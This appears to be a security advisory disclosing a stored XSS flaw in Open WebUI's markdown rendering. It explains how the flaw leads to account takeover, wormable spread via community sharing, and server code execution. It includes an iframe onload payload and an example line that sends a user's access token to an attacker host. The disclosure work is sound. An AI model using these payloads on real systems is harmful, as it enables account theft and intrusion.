summary: "Open WebUI vulnerable to stored XSS via unescaped markdown token in MarkdownTokens.svelte\
  \ leading to full account takeover and RCE via functions\n### Summary\n\nA vulnerability in\
  \ the way certain html tags in chat messages are rendered allows attackers to inject JavaScript\
  \ code into a chat transcript. The JavaScript code will be executed in the user's browser\
  \ every time that chat transcript is opened, allowing attackers to retrieve the user's access\
  \ token and gain full control over their account. Chat transcripts can be shared with other\
  \ users in the same server, or with the whole open-webui community if \"Enable Community Sharing\"\
  \ is enabled in the admin panel.\n\nIf this exploit is used against an admin user, it is possible\
  \ to achieve Remote Code Execution on the server where the open-webui backend is hosed. This\
  \ can be done by creating a new function which contains maliicious python code.\n\n**This\
  \ vulnerability also affects chat transcripts uploaded to `https://openwebui.com/c/<user>/<chat_id>`,\
  \ allowing for wormable stored XSS in https://openwebui.com**\n\n### Details\n\n### Stored\
  \ XSS\n\nThe file https://github.com/open-webui/open-webui/blob/main/src/lib/components/chat/Messages/Markdown/MarkdownTokens.svelte#L269-L279\
  \ contains the following code:\n```TypeScript\n\t\t{:else if token.text.includes(`<iframe\
  \ src=\"${WEBUI_BASE_URL}/api/v1/files/`)}\n\t\t\t{@html `${token.text}`}\n``` \nThat code\
  \ checks if a chat message has an html tag which contains the text `<iframe src=\"${WEBUI_BASE_URL}/api/v1/files/`,\
  \ and if so, it renders that html tag using `{@html}`, which is a dangerous Svelte functionality\
  \ that allows text to be rendered as HTML code.\n\nAttackers can abuse this by sending a chat\
  \ message with the following payload:\n`<iframe src=\"http://localhost:8080/api/v1/files/\"\
  \ onload=\"alert(1)\"></iframe>`, where `http://localhost:8080` is the URL where the open-webui\
  \ backend server is hosted.\n\nThis will cause a JavaScript alert window to be displayed every\
  \ time that chat transcript is opened.\n\n![image](https://github.com/user-attachments/assets/1e7da1f9-4154-402a-b5f1-4a50a0b4a227)\n\
  ![image](https://github.com/user-attachments/assets/f8f463c7-731a-41e0-9e75-c2747639bc5f)\n\
  \nIn a real attack scenario, instead of injecting `alert(1)` in the `onload` attribute, attackers\
  \ can use the following code to steal the user's access token and send it to a server they\
  \ control:\n`fetch(\"https://attacker.com/?token=\" + localStorage.getItem(\"token\"))`\n\n\
  This is possible because the access token is stored inside the user's localStorage, which\
  \ is accessible by JavaScript.\n\nThen, once the attacker has created a chat transcript which\
  \ contains that payload, they can share that transcript with other users on the same server\
  \ by clicking on the 3 dots next to the chat transcript on the left, and clicking \"Share\"\
  \n\n![image](https://github.com/user-attachments/assets/200e3ab1-36d9-4d0c-a869-dd60ae112fc9)\n\
  \n**If \"Enable Community Sharing\" is enabled in the admin panel. attackers can upload the\
  \ infected chat transcript to https://openwebui.com/, where the Stored XSS payload will be\
  \ executed**\n\n![image](https://github.com/user-attachments/assets/b9bab780-5fc2-439c-9875-d08cedadd99b)\n\
  \nThis makes the exploit a **wormable Stored XSS**. Attackers can upload an infected chat\
  \ to their profile which has JavaScript code to upload a similar infected chat to the visitori's\
  \ profile, share it with other members of the open-webui community, and infect their profiles\
  \ as well.\n\n<hr>\n\n### RCE\n\nIf an attacker manages to steal an admin user's token, they\
  \ can then achieve RCE on the backend server by creating a function (http://localhost:5174/admin/functions),\
  \ which by design allows admins to execute arbitrary python code on the backend server.\n\n\
  The following HTTP request can be sent to the backend server to execute arbitrary python code.\n\
  \n![image](https://github.com/user-attachments/assets/572a1594-cb39-4232-a834-efe625fd3667)\n\
  ![image](https://github.com/user-attachments/assets/c5b34773-759d-4f0d-9ed8-0b5078e24d1f)\n\
  \n\n### PoC\n\nAttackers can abuse this by sending a chat message with the following payload:\n\
  `<iframe src=\"http://localhost:8080/api/v1/files/\" onload=\"alert(1)\"></iframe>`, where\
  \ `http://localhost:8080` is the URL where the open-webui backend server is hosted.\n\n###\
  \ Impact\n\nAttackers can send a a link to a shared chat transcript to other users on the\
  \ same server to take control over their accounts. They can also upload the chat to https://openwebui.com\
  \ and take control over other users' accounts."
